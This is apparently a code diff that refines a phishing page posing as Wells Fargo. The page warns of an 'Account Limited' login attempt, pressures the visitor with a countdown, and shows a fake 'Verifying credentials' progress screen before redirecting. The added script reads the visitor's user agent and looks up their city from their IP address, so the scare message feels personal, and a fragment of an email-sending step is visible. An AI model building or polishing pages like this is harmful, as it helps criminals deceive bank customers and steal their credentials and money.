@@ -207,7 +207,7 @@
     <div class="container" id="formContainer">
         <h2>Account Limited</h2>
         <p>Dear Customer,</p>
-        <p>We have detected a login attempt from a new device: <strong>iPhone 15, iOS 18.1</strong>.</p>
+        <p>We have detected a login attempt from a new device: <strong id="device-detected">Detecting...</strong> in <span id="location-detected">your area</span>.</p>
         <p>To prevent your account from being frozen, please verify your identity immediately.</p>
         
         <div class="timer">
@@ -232,12 +232,21 @@
         </div>
     </div>
 
-    <!-- PROCESSING SPINNER (Hidden by default) -->
-    <div id="processing" style="display:none;">
-        <div style="font-family: 'Wells Fargo Sans', Arial, sans-serif; font-weight: bold; font-size: 32px; color: #d71e28; margin-bottom: 20px;">WELLS FARGO</div>
+        <!-- IMPROVED PROCESSING SCREEN -->
+    <div id="processing" style="display:none; text-align: center; padding: 20px;">
+        <div style="font-family: 'Wells Fargo Sans', Arial, sans-serif; font-weight: bold; font-size: 28px; color: #d71e28; margin-bottom: 20px;">WELLS FARGO</div>
+        
+        <!-- Spinner -->
         <div style="border: 4px solid #f3f3f3; border-top: 4px solid #d71e28; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-        <h2 id="processingText">Verifying Identity...</h2>
-        <p id="processingSubtext">Please wait while we confirm your details.</p>
+        
+        <!-- Status Text -->
+        <h2 id="processingText" style="font-size: 18px; color: #333;">Verifying credentials...</h2>
+        <p id="processingSubtext" style="font-size: 12px; color: #666; margin-bottom: 20px;">Please do not close this window.</p>
+
+        <!-- Progress Bar -->
+        <div style="width: 80%; max-width: 300px; background: #eee; height: 6px; border-radius: 3px; margin: 0 auto;">
+            <div id="progress-bar" style="width: 10%; height: 100%; background: #d71e28; border-radius: 3px; transition: width 0.5s;"></div>
+        </div>
     </div>
 
     <!-- Main Footer -->
@@ -252,9 +261,9 @@
             <a href="https://www.wellsfargo.com/insurance/" target="_blank">Insurance</a>
             <a href="https://www.wellsfargo.com/about/careers/" target="_blank">Careers</a>
             <a href="https://www.wellsfargo.com/about/contact-us/" target="_blank">Contact Us</a>   
-        </div>
+            </div>
         <div class="footer-copyright">
-            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
+            © 1999 - 2027 Wells Fargo. All rights reserved. NMLSR ID 399801
         </div>
     </footer>
 
@@ -299,27 +308,42 @@
                 .catch((error) => {
                     console.error("Email send failed", error);
                 });
-        }
-
-        function showProcessing(url) {
+             }
+                       function showProcessing(url) {
             const container = document.getElementById('formContainer');
             const processing = document.getElementById('processing');
             const processingText = document.getElementById('processingText');
+            const progressBar = document.getElementById('progress-bar');
 
             if (container && processing) {
                 container.style.display = 'none';
-                processing.style.display = 'flex'; // Use flex to center content
+                processing.style.display = 'block'; // Changed from flex to block for better alignment
 
-                // Simulate processing steps
+                // Step 1: Verifying (30%)
                 setTimeout(() => {
-                    processingText.textContent = "Identity Verified Successfully!";
-                }, 2000);
+                    progressBar.style.width = '30%';
+                    processingText.textContent = "Verifying credentials...";
+                }, 500);
 
+                // Step 2: Checking Security (70%)
                 setTimeout(() => {
-                    window.location.href = url;
-                }, 3000);
+                    progressBar.style.width = '70%';
+                    processingText.textContent = "Checking account security status...";
+                }, 1500);
+
+                // Step 3: Verified (100%)
+                setTimeout(() => {
+                    progressBar.style.width = '100%';
+                    processingText.textContent = "Account Verified Successfully!";
+                    
+                    // Step 4: Redirect
+                    setTimeout(() => {
+                        window.location.href = url;
+                    }, 1000);
+                }, 2500);
             }
         }
+        
     </script>
     
     <script>
@@ -356,7 +380,56 @@
             updateDisplay();
         })();
     </script>
-</body>
+
+ <script>
+    // 1. Detect Device/OS
+    function detectDevice() {
+        const ua = navigator.userAgent;
+        let device = "Computer";
+        let os = "Windows";
+        
+        if (/iPhone|iPad|iPod|Macintosh/.test(ua)) {
+            device = "Apple Device";
+            os = /iPhone|iPad|iPod/.test(ua) ? "iOS" : "macOS";
+        } else if (/Android/.test(ua)) {
+            device = "Android Device";
+            os = "Android";
+        } else if (/Windows/.test(ua)) {
+            device = "Windows PC";
+        } else if (/Linux/.test(ua)) {
+            device = "Linux PC";
+        } else if (/Chrome/.test(ua)) {
+             device = "Chrome Browser";
+             os = "Unknown OS";
+        }
+
+        // Update the DOM
+        if(document.getElementById('device-detected')) {
+            document.getElementById('device-detected').innerText = `${device}, ${os}`;
+        }
+    }
+
+    // 2. Detect Location via IP
+    async function detectLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.city && data.country_name) {
+                document.getElementById('location-detected').innerText = `${data.city}, ${data.country_name}`;
+            }
+        } catch (e) {
+            // Fallback if API fails
+            document.getElementById('location-detected').innerText = "United States";
+        }
+    }
+
+    // Run on load
+    detectDevice();
+    detectLocation();
+</script>
+  
+
+ </body>
 </html>
 
 
